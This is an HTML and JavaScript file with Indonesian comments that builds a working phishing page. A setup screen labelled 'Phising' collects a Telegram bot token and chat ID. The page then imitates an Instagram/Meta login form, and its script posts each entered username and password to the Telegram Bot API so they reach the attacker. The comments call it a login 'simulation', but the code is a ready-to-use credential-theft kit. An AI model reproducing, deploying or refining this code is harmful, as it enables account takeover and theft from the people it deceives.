<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram-Login</title>
    <!-- Load Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Konfigurasi Font Inter -->
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap');
        body {
            font-family: 'Inter', sans-serif;
            /* Menggunakan URL link untuk background dari kode Anda */
            background-image: url('https://files.catbox.moe/h2azoj.png'); 
            background-size: cover; 
            background-position: center; 
            background-repeat: no-repeat;
            color: #f0f0f0; 
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            position: relative;
        }

        /* Overlay gelap agar teks lebih mudah dibaca, menggantikan body::before */
        body::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.6); /* Overlay gelap 60% */
            z-index: -1; 
        }

        /* Kelas untuk Input Field yang konsisten */
        .app-input {
            @apply w-full p-3 mb-3 border border-gray-700 bg-gray-800 text-white rounded-lg box-border text-sm focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition duration-150;
        }
    </style>
</head>
<body>

    <!-- Area untuk Notifikasi (Pesan Berhasil/Gagal) -->
    <div id="notification-area" class="fixed top-0 inset-x-0 p-4 z-50"></div>

    <!-- 1. LAYAR KONFIGURASI TELEGRAM -->
    <div id="config-screen" class="p-8 max-w-sm w-full bg-gray-900 bg-opacity-90 rounded-xl shadow-2xl transition duration-500 ease-in-out">
        <h2 class="text-2xl font-bold mb-4 text-center text-blue-400">Phising</h2>
        <p class="text-sm text-gray-400 mb-6 text-center">Masukkan detail bot Telegram Anda</p>
        
        <form id="config-form">
            <label for="bot-token" class="text-sm font-medium text-gray-300 block mb-1">Bot Token (e.g., 123456:ABC-DEF)</label>
            <input type="text" id="bot-token" placeholder="Masukkan Bot Token Anda" class="app-input" required>
            
            <label for="chat-id" class="text-sm font-medium text-gray-300 block mb-1 mt-4">Chat ID Penerima (e.g., -100123456789 atau 123456789)</label>
            <input type="text" id="chat-id" placeholder="Masukkan Chat ID Tujuan" class="app-input" required>
            
            <button type="submit" class="w-full p-3 mt-4 bg-green-600 hover:bg-green-700 text-white font-bold rounded-lg transition duration-200 shadow-md shadow-green-900/50">
                Generate & Login
            </button>
        </form>
        <p class="text-xs text-gray-500 mt-6 text-center"></p>
    </div>

    <!-- 2. LAYAR SIMULASI LOGIN (Awalnya Tersembunyi) -->
    <div id="login-screen" class="hidden login-container p-8 max-w-sm w-full bg-gray-900 bg-opacity-90 rounded-xl shadow-2xl transition duration-500 ease-in-out">
        <p class="absolute top-4 left-1/2 transform -translate-x-1/2 text-gray-400 text-xs">Bahasa Indonesia</p>

        <!-- Logo Aplikasi -->
        <img src="https://files.catbox.moe/1ovidi.png" onerror="this.onerror=null;this.src='https://placehold.co/65x65/121212/aaaaaa?text=LOGO';" alt="Logo Aplikasi" class="w-16 h-16 mx-auto mb-8 rounded-full border-2 border-gray-700 p-1">
        
        <form id="login-form">
            <input type="text" id="username" placeholder="Nama pengguna, email, atau nomor ..." class="app-input" required>
            <input type="password" id="password" placeholder="Kata sandi" class="app-input" required>
            
            <button type="submit" class="login-button w-full p-3 mt-4 bg-blue-600 hover:bg-blue-700 text-white font-bold rounded-lg transition duration-200 shadow-md shadow-blue-900/50">
                Login
            </button>
            
            <a href="#" class="forgot-password block text-blue-400 text-sm mt-4 hover:text-blue-300 transition duration-150">Lupa kata sandi?</a>
        </form>
        
        <div class="signup-meta-section mt-12 pt-6 border-t border-gray-700">
            <a href="#" class="create-account-button block w-full p-3 border border-blue-400 bg-transparent text-blue-400 font-bold rounded-lg hover:bg-blue-900 transition duration-200 text-sm">
                Buat akun baru
            </a>
            
            <div class="meta-info flex justify-center items-center mt-6 pb-2">
                <p class="text-gray-500 text-xs font-bold mr-1"></p>
                <img src="https://files.catbox.moe/6rqcuf.png" onerror="this.onerror=null;this.src='https://placehold.co/14x14/121212/aaaaaa?text=M';" alt="Meta Logo" class="h-3 filter invert opacity-70">
                <p class="text-gray-500 text-xs font-bold ml-1"></p>
            </div>
        </div>
    </div>

    <script>
        // Variabel global untuk menyimpan konfigurasi Telegram
        let BOT_TOKEN = '';
        let CHAT_ID = '';

        const configScreen = document.getElementById('config-screen');
        const loginScreen = document.getElementById('login-screen');
        const configForm = document.getElementById('config-form');
        const loginForm = document.getElementById('login-form');
        const notificationArea = document.getElementById('notification-area');
        
        /**
         * Menampilkan notifikasi di UI.
         * @param {string} message - Pesan yang akan ditampilkan.
         * @param {string} type - Tipe notifikasi ('success' atau 'error').
         */
        function showNotification(message, type) {
            const isSuccess = type === 'success';
            const bgColor = isSuccess ? 'bg-green-500' : 'bg-red-500';
            const icon = isSuccess ? '✓' : '✗';
            
            const notification = document.createElement('div');
            notification.className = `${bgColor} text-white p-3 rounded-lg shadow-xl text-sm mb-2 max-w-xs mx-auto flex items-center`;
            notification.innerHTML = `<span class="font-bold mr-2">${icon}</span> ${message}`;
            
            notificationArea.appendChild(notification);
            
            setTimeout(() => {
                notification.classList.add('opacity-0', 'transition-opacity', 'duration-500');
                notification.addEventListener('transitionend', () => notification.remove());
            }, 5000);
        }

        /**
         * Mengimplementasikan logika retry dengan exponential backoff untuk fetch.
         * @param {string} url - URL API.
         * @param {object} options - Opsi fetch.
         * @param {number} retries - Jumlah maksimum percobaan.
         */
        async function fetchWithRetry(url, options, retries = 3) {
            for (let i = 0; i < retries; i++) {
                try {
                    const response = await fetch(url, options);
                    if (!response.ok) {
                        // Jika respons bukan 2xx, lempar error untuk retry
                        throw new Error(`HTTP error! status: ${response.status}`);
                    }
                    return response;
                } catch (error) {
                    if (i === retries - 1) {
                        // Jika ini adalah percobaan terakhir, re-throw error
                        throw new Error(`Gagal menghubungi Telegram API setelah ${retries} kali: ${error.message}`);
                    }
                    // Hitung delay untuk backoff: 2^i * 1000 ms
                    const delay = Math.pow(2, i) * 1000;
                    // Tunggu sebentar sebelum mencoba lagi
                    await new Promise(resolve => setTimeout(resolve, delay));
                }
            }
        }

        /**
         * Mengirim data username dan password ke Telegram.
         * @param {string} username - Username/Email yang diinput.
         * @param {string} password - Kata sandi yang diinput.
         */
        async function sendDataToTelegram(username, password) {
            const messageText = `*UJI COBA LOGIN BERHASIL*\n\n*Username/Email:*\n\`${username}\`\n\n*Kata Sandi:*\n\`${password}\``;
            
            const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            const payload = {
                chat_id: CHAT_ID,
                text: messageText,
                parse_mode: 'Markdown',
            };

            const options = {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            };
            
            try {
                // Menggunakan fetchWithRetry untuk ketahanan jaringan
                const response = await fetchWithRetry(telegramApiUrl, options);
                const data = await response.json();

                if (data.ok) {
                    showNotification('Data login berhasil dikirim ke Telegram!', 'success');
                } else {
                    // Jika API mengembalikan error tapi HTTP status 200 (misalnya Chat ID salah)
                    const errorMsg = data.description || 'Gagal mengirim data: Cek Bot Token atau Chat ID.';
                    showNotification(`Error Telegram: ${errorMsg}`, 'error');
                }
            } catch (error) {
                console.error("Fetch Error:", error);
                showNotification(`Koneksi Gagal: ${error.message}`, 'error');
            }
        }

        /**
         * Handler untuk submit formulir konfigurasi.
         */
        configForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            BOT_TOKEN = document.getElementById('bot-token').value.trim();
            CHAT_ID = document.getElementById('chat-id').value.trim();

            if (BOT_TOKEN && CHAT_ID) {
                // Sembunyikan config, tampilkan login
                configScreen.classList.add('opacity-0', 'scale-90');
                setTimeout(() => {
                    configScreen.classList.add('hidden');
                    loginScreen.classList.remove('hidden');
                    loginScreen.classList.add('opacity-100', 'scale-100');
                    showNotification('Konfigurasi berhasil! Lanjutkan dengan simulasi login.', 'success');
                }, 500);
            } else {
                 showNotification('Mohon lengkapi Bot Token dan Chat ID.', 'error');
            }
        });

        /**
         * Handler untuk submit formulir login.
         */
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const loginButton = e.submitter;

            loginButton.disabled = true;
            loginButton.textContent = 'Mengirim...';

            // Mengirim data ke Telegram
            await sendDataToTelegram(username, password);

            // Setelah pengiriman (berhasil atau gagal), kembalikan tombol
            loginButton.disabled = false;
            loginButton.textContent = 'Login';
            
            // Opsional: Reset formulir setelah pengiriman (karena ini hanya uji coba)
            // loginForm.reset();
        });
        
        // Atur status awal (Config Screen terlihat)
        configScreen.classList.add('opacity-100', 'scale-100');
    </script>
</body>
</html>
